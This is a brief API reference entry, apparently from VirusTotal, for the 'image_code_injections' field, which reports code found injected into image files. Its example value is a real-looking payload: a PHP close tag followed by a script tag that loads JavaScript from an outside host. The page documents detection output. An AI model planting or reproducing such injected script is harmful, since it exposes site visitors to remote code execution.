# Source: https://virustotal.readme.io/reference/file-object-image-code-injections.md

# image_code_injections

code injection inside image files.

`image_code_injections` returns content of code injection inside image files.

```json image code injection
{
  "data": {
		...
    "attributes" : {
      ...
      "image_code_injections": "<string>"
    }
  }
}
```
```json Example
{
    "data": {
        "attributes": {
            "image_code_injections": "?><script src=\"http://j56.gr/bin/s.js\"></script>"
        }
    }
}
```